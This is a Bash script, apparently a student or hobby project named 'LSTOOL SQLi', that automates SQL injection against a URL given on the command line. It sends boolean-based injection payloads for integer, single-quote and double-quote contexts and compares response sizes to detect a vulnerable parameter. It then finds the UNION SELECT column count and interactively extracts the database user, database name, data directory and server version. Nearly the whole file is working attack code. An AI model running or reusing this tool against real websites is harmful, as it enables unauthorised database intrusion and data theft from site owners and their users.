#!/bin/bash

#definicion de funciones tiene que ir lo primero

analyseWeb () {
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⢀⡀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡖⠁⠀⠀⠀⠀⠀⠀⠈⢲⣄⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣇⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⢀⣀⣤⣤⣤⣤⣀⡀⠀⢸⣿⣿⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣔⢿⡿⠟⠛⠛⠻⢿⡿⣢⣿⣿⡟⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣷⣤⣀⡀⢀⣀⣤⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀"
echo "⠀⠀⢠⣾⣿⡿⠿⠿⠿⣿⣿⣿⣿⡿⠏⠻⢿⣿⣿⣿⣿⠿⠿⠿⢿⣿⣷⡀⠀"
echo "⠀⢠⡿⠋⠁⠀⠀⢸⣿⡇⠉⠻⣿⠇⠀⠀⠸⣿⡿⠋⢰⣿⡇⠀⠀⠈⠙⢿⡄⠀"
echo "⠀⡿⠁⠀⠀⠀⠀⠘⣿⣷⡀⠀⠰⣿⣶⣶⣿⡎⠀⢀⣾⣿⠇⠀⠀⠀⠀⠈⢿⠀"
echo "⠀⡇⠀⠀⠀⠀⠀⠀⠹⣿⣷⣄⠀⣿⣿⣿⣿⠀⣠⣾⣿⠏⠀⠀⠀⠀⠀⠀⢸⠀"
echo "⠀⠁⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⢇⣿⣿⣿⣿⡸⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠈⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠐⢤⣀⣀⢀⣀⣠⣴⣿⣿⠿⠋⠙⠿⣿⣿⣦⣄⣀⠀⠀⣀⡠⠂⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠛⠉⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠛⠋⠁⠀⠀⠀⠀⠀"
echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"

#miraremos cuantas columnas hay y donde se reflejan los datos
sleep 3
echo "---------------------------------------------------------------------------"
echo "SEARCHING FOR NUMBER OF COLUMNS AND WHERE DATA IS DISPLAYED..."
echo "---------------------------------------------------------------------------"
sleep 2
#ajustar url segun que opcion de sql injection es para ver que pruebas hacer

if [ $option = 1 ]; then #si es integer
 urlPrueba="$int2%20union%20select%20"
elif [ $option = 2 ]; then #si es quote
 urlPrueba="$coma2'%20union%20select%20"
else #si es double quote
 urlPrueba="$dcoma2\"%20union%20select%20"
fi


pruebas=0 #numero de pruebas max
while [ $pruebas -lt 10 ]
do
 for ((i=1; i<=10; i++)) #hasta 10 pruebas
 do
 nums="$i$i$i$i$i$i$i$i$i$i$i$i"
 if [ $i = 1 ]; then #primera iteracion
  urlPrueba="$urlPrueba$nums"
 else  #no primera iteracion
  urlPrueba="$urlPrueba,$nums"
 fi
 if [ $option != 1 ]; then #si es opcion 2 0 3 (quotes o double quotes) aniadimos -- - 
  curl -s "$urlPrueba%20--%20-" > pruebaColumnas.txt
 else #sino nada
  curl -s $urlPrueba > pruebaColumnas.txt
 fi

 if [ $(grep -c $nums pruebaColumnas.txt) != 0 ]; then
  echo "---------------------------------------------------------------------------"
  echo "FOUND! DATA IS REFLECTED. COLUMN NUMBERS ----> $i"
  echo "---------------------------------------------------------------------------"
  pruebas=10
  break
 else
  ((pruebas++))
 fi
 done
done

#analisis de datos basicos 


echo "---------------------------------------------------------------------------"
echo "What information do you want to analyse?"
echo "1. User 2. Database 3. Datadir 4. Version 5. Exit"
queryURL=$(echo $urlPrueba | rev | cut -c13- | rev) #variable nueva quitando los ultimos 12 numeros caracteres de la url que funciono

resp=0
while [ $resp != 5 ]
do
 read -r resp
 if [ $resp = 1 ]; then
  userURL="$queryURL" #crear nueva variable porque no concatenaba bien
  userURL+="user()"
  if [ $option != 1 ]; then #si es opcion 2 0 3 (quotes o double quotes) aniadimos -- -
   curl -s "$userURL%20--%20-" > pruebaUser.txt
  else #sino nada
   curl -s "$userURL" > pruebaUser.txt
  fi
  comm -23 <(tr ' ' '\n' < pruebaUser.txt | sort) <(tr ' ' '\n' < pruebaColumnas.txt | sort) | paste -sd ' ' > userQuery.txt
  #grep -vF -f pruebaColumnas.txt pruebaUser.txt > userQuery.txt #ver lo que ha cambiado (seria cambiar numero por resultado de query)
  cat userQuery.txt
 elif [ $resp = 2 ]; then
  databaseURL="$queryURL"
  databaseURL+="database()"
  if [ $option != 1 ]; then #si es opcion 2 0 3 (quotes o double quotes) aniadimos -- -
   curl -s "$databaseURL%20--%20-" > pruebaDatabase.txt
  else #sino nada
   curl -s "$databaseURL" > pruebaDatabase.txt
  fi
  comm -23 <(tr ' ' '\n' < pruebaDatabase.txt | sort) <(tr ' ' '\n' < pruebaColumnas.txt | sort) | paste -sd ' ' > databaseQuery.txt
  #grep -Fxvf pruebaColumnas.txt pruebaDatabase.txt > databaseQuery.txt #ver lo que ha cambiado (seria cambiar numero por resultado de query)
  cat databaseQuery.txt
 elif [ $resp = 3 ]; then
  if [ $option != 1 ]; then #si es opcion 2 0 3 (quotes o double quotes) aniadimos -- -
   curl -s "$queryURL@@datadir%20--%20-" > pruebaDatadir.txt
  else #sino nada
   curl -s "$queryURL@@datadir" > pruebaDatadir.txt
  fi
  comm -23 <(tr ' ' '\n' < pruebaDatadir.txt | sort) <(tr ' ' '\n' < pruebaColumnas.txt | sort) | paste -sd ' ' > datadirQuery.txt
  #grep -Fxvf pruebaColumnas.txt pruebaDatadir.txt > datadirQuery.txt #ver lo que ha cambiado (seria cambiar numero por resultado de query)
  cat datadirQuery.txt
 elif [ $resp = 4 ]; then
  if [ $option != 1 ]; then #si es opcion 2 0 3 (quotes o double quotes) aniadimos -- -
   curl -s "$queryURL@@version%20--%20-" > pruebaVersion.txt
  else #sino nada
   curl -s "$queryURL@@version" > pruebaVersion.txt
  fi
  comm -23 <(tr ' ' '\n' < pruebaVersion.txt | sort) <(tr ' ' '\n' < pruebaColumnas.txt | sort) | paste -sd ' ' > versionQuery.txt
  #grep -Fxvf pruebaColumnas.txt pruebaVersion.txt > versionQuery.txt #ver lo que ha cambiado (seria cambiar numero por resultado de query)
  cat versionQuery.txt
 elif [ $resp -gt 4 ] && [ $resp != 5 ]; then
  echo "Incorrect option. Try again."
 fi
done

}

echo "---------------------------------------------------------------------------"
echo "---------------------------------------------------------------------------"
figlet LSTOOL SQLi
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡀⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠄⠄⠄⠁⠄⠁⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⣴⣿⣿⡿⣿⢿⣟⣿⣻⣟⡿⣟⣿⣟⡿⣟⣿⣻⣟⣿⣻⢿⣻⡿⣿⢿⣷⣆⠄⠄⠄"
echo "⠄⠄⠄⢘⣿⢯⣷⡿⡿⡿⢿⢿⣷⣯⡿⣽⣞⣷⣻⢯⣷⣻⣾⡿⡿⢿⢿⢿⢯⣟⣞⡮⡀⠄⠄"
echo "⠄⠄⠄⢸⢞⠟⠃⣉⢉⠉⠉⠓⠫⢿⣿⣷⢷⣻⣞⣿⣾⡟⠽⠚⠊⠉⠉⠉⠙⠻⣞⢵⠂⠄⠄"
echo "⠄⠄⠄⢜⢯⣺⢿⣻⣿⣿⣷⣔⡄⠄⠈⠛⣿⣿⡾⠋⠁⠄⠄⣄⣶⣾⣿⡿⣿⡳⡌⡗⡅⠄⠄"
echo "⠄⠄⠄⢽⢱⢳⢹⡪⡞⠮⠯⢯⡻⡬⡐⢨⢿⣿⣿⢀⠐⡥⣻⡻⠯⡳⢳⢹⢜⢜⢜⢎⠆⠄⠄"
echo "⠄⠄⠠⣻⢌⠘⠌⡂⠈⠁⠉⠁⠘⠑⢧⣕⣿⣿⣿⢤⡪⠚⠂⠈⠁⠁⠁⠂⡑⠡⡈⢮⠅⠄⠄"
echo "⠄⠄⠠⣳⣿⣿⣽⣭⣶⣶⣶⣶⣶⣺⣟⣾⣻⣿⣯⢯⢿⣳⣶⣶⣶⣖⣶⣮⣭⣷⣽⣗⠍⠄⠄"
echo "⠄⠄⢀⢻⡿⡿⣟⣿⣻⣽⣟⣿⢯⣟⣞⡷⣿⣿⣯⢿⢽⢯⣿⣻⣟⣿⣻⣟⣿⣻⢿⣿⢀⠄⠄"
echo "⠄⠄⠄⡑⡏⠯⡯⡳⡯⣗⢯⢟⡽⣗⣯⣟⣿⣿⣾⣫⢿⣽⠾⡽⣺⢳⡫⡞⡗⡝⢕⠕⠄⠄⠄"
echo "⠄⠄⠄⢂⡎⠅⡃⢇⠇⠇⣃⣧⡺⡻⡳⡫⣿⡿⣟⠞⠽⠯⢧⣅⣃⠣⠱⡑⡑⠨⢐⢌⠂⠄⠄"
echo "⠄⠄⠄⠐⠼⣦⢀⠄⣶⣿⢿⣿⣧⣄⡌⠂⠢⠩⠂⠑⣁⣅⣾⢿⣟⣷⠦⠄⠄⡤⡇⡪⠄⠄⠄"
echo "⠄⠄⠄⠄⠨⢻⣧⡅⡈⠛⠿⠿⠿⠛⠁⠄⢀⡀⠄⠄⠘⠻⠿⠿⠯⠓⠁⢠⣱⡿⢑⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠈⢌⢿⣷⡐⠤⣀⣀⣂⣀⢀⢀⡓⠝⡂⡀⢀⢀⢀⣀⣀⠤⢊⣼⡟⡡⡁⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠈⢢⠚⣿⣄⠈⠉⠛⠛⠟⠿⠿⠟⠿⠻⠻⠛⠛⠉⠄⣠⠾⢑⠰⠈⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠑⢌⠿⣦⡡⣱⣸⣸⣆⠄⠄⠄⣰⣕⢔⢔⠡⣼⠞⡡⠁⠁⠄⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠑⢝⢷⣕⡷⣿⡿⠄⠄⠠⣿⣯⣯⡳⡽⡋⠌⠄⠄⠄⠄⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢮⣿⣽⣯⠄⠄⢨⣿⣿⡷⡫⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠙⠝⠂⠄⢘⠋⠃⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄"
echo "⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄"
echo "---------------------------------------------------------------------------"
echo "---------------------------------------------------------------------------"
sleep 2
echo "WEBSITE: $1"
echo "---------------------------------------------------------------------------"
curl -s $1 > website.txt #-s para no enseñar descarga de curl
echo "---------------------------------------------------------------------------"
echo "TRYING TO SEE IF WEBSITE IS VULNERABLE TO SQL INJECTION..."
echo "---------------------------------------------------------------------------"
#pruebas para ver si web es sqli vulnerable

int1="$1%20and%201=1" #%20 para los espacios que sino curl se raya
int2="$1%20and%201=0"
coma1="$1'%20and%20'1'='1"
coma2="$1'%20and%20'1'='0"
dcoma1="$1\"%20and%20\"1\"=\"1"
dcoma2="$1\"%20and%20\"1\"=\"0"

#guardamos respuesta de la web a las urls maliciosas con las pruebas 

curl -s $int1 > pruebaInteger1n1.txt
curl -s $int2 > pruebaInteger1n0.txt
curl -s $coma1 > pruebaComa1n1.txt
curl -s $coma2 > pruebaComa1n0.txt
curl -s $dcoma1 > pruebaDComa1n1.txt
curl -s $dcoma2 > pruebaDComa1n0.txt


#guardamos tamaño de las respuestas

sizeWeb="$(wc -c <'website.txt')" #guardamos cuanto ocupa/tamaño de la respuesta (cuantas palabras tiene la web respondida)
sizeWebI="$(wc -c <'pruebaInteger1n1.txt')"
sizeWebI2="$(wc -c <'pruebaInteger1n0.txt')"
sizeWebC="$(wc -c <'pruebaComa1n1.txt')"
sizeWebC2="$(wc -c <'pruebaComa1n0.txt')"
sizeWebDC="$(wc -c <'pruebaDComa1n1.txt')"
sizeWebDC2="$(wc -c <'pruebaDComa1n0.txt')"

#cramos array con estos valores

declare -a tamWeb
tamWeb=($sizeWebI $sizeWebI2 $sizeWebC $sizeWebC2 $sizeWebDC $sizeWebDC2)

#prueba para comprobar si ha habido cambio en la web en alguna de las pruebas

#si es vulnerable
echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "
echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "
if [ "${tamWeb[0]}" != "${tamWeb[1]}" ] && [ "${tamWeb[0]}" -eq "$sizeWeb" ]; then #condicion para ver si es vulnerable: que la negada cambie y que la true sea igual a la pag original (una sola condicion??)
 echo "SUCCESS!! WEBSITE IS VULNERABLE TO INTEGER SQL INJECTION"
 #llamada a funcion
 option=1
 analyseWeb
elif [ "${tamWeb[2]}" != "${tamWeb[3]}" ] && [ "${tamWeb[2]}" -eq "$sizeWeb" ]; then
 echo "SUCCESS!! WEBSITE IS VULNERABLE TO SINGULAR QUOTE SQL INJECTION"
 #llamada a funcion
 option=2
 analyseWeb
elif [ "${tamWeb[4]}" != "${tamWeb[5]}" ] && [ "${tamWeb[4]}" -eq "$sizeWeb" ]; then
 echo "SUCCESS!! WEBSITE IS VULNERABLE TO DOUBLE QUOTE INJECTION"
 #llamada a funcion
 option=3
 analyseWeb
#si no es vulnerable
else
 echo "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣵⣶⣬⣉⡻⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿"
 echo "⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⣃⣸⣿⣿⣿⣿⣿⣿⣷⣦⢸⣿⣿⣿⣿⣿⣿⣿⣿"
 echo "⣿⣿⣿⣿⣿⣿⢡⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣭⣙⠿⣿⣿⣿⣿⣿"
 echo "⣿⣿⣿⣿⡿⠿⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⣿⣿⣿⣿"
 echo "⣿⣿⣿⠋⣴⣾⣿⣿⣿⡟⠁⠄⠙⣿⣿⣿⣿⠁⠄⠈⣿⣿⣿⣿⣈⠛⢿⣿⣿"
 echo "⣿⣿⣇⢸⣿⣿⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣦⣤⣴⣿⣿⣿⣿⣿⣷⡄⢿⣿"
 echo "⣿⠟⣋⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿"
 echo "⢁⣾⣿⣿⣿⣿⣿⡉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⣿⣿⣦⠙"
 echo "⣾⣿⣿⣿⣿⣿⣿⣿⣦⣄⣤⣶⣿⣿⣿⣿⣿⣿⣷⣦⣄⣤⣾⣿⣿⣿⣿⣿⣧"
 echo "⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏"
 echo "⣷⣦⣙⠛⠿⢿⣿⣿⡿⠿⠿⠟⢛⣛⣛⡛⠻⠿⠿⠿⣿⣿⣿⣿⠿⠟⢛⣡⣾"
 echo ""
 echo "FAILURE. WEBSITE IS NOT VULNERABLE TO SQL INJECTION"
 echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "
 echo "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "
fi

rm *.txt 

echo "---------------------------------------------------------------------------"
figlet Goodbye ! 
echo "---------------------------------------------------------------------------"
